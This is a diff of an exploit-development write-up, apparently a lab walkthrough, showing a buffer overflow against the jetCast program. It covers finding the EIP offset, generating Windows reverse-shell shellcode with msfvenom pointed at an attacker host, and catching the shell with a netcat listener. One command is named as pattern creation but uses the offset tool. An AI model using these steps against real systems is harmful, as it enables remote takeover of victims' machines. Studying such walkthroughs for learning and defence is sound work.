@@ -31,11 +31,11 @@ Now that we know there is a buffer overflow, we need to find where in the buffer
 
 To find the offset, we can create a non-repeating string of characters using the msf-pattern_create tool, specifying a length of 5000 characters:
 ```
-msf-pattern_offset -l 5000
+$ msf-pattern_offset -l 5000
 ```
 We can take this output and place it into our POC script. Following the same procedure as the first step, we run the script, transfer the output file to the Windows machine, open jetCast in Immunity, and place the non-repeating string into the log directory location. This time when the program crashes, we see that the EIP register is filled with "72413772", the hex equivalent of "rA7r". To find where this set of characters is in the pattern we created, we can use the following:
 ```
-msf-pattern_offset -q 72413772
+$ msf-pattern_offset -q 72413772
 [*] Exact match at offset 532
 ```
 We now know that the EIP offset will be at 532, so we can modify our code to begin controlling the EIP register.
@@ -120,7 +120,7 @@ to receive a list of all loaded modules for the program, find one that suits our
 ## Generating shellcode
 Now that we have verified we can control the EIP and ESP registers, we can move onto generating shellcode. There are quite a number of ways to do this, but I used msfvenom to do so:
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=10.2.2.5 LPORT=4444 -b "\x00\x0d" -f py -v shellcode
+$ msfvenom -p windows/shell_reverse_tcp LHOST=10.2.2.5 LPORT=4444 -b "\x00\x0d" -f py -v shellcode
 ```
 Breakdown:
 - -p windows/shell_reverse_tcp: will use this as the payload
@@ -153,7 +153,7 @@ Once more, run the script and transfer the output file over to Windows.
 ## Getting a Shell
 Before we send the exploit string to the program, we need to set up a listener on our attacking machine. To do so, we can simply use netcat:
 ```
-nc -nvlp 4444
+$ nc -nvlp 4444
 ```
 
 This time in Windows, we won't need to use Immunity to start the program. Just run the program normally, copy the exploit string into the Log Directory input, and click Start. When we check back on our attacking machine we should have a shell to the Windows machine. Success!
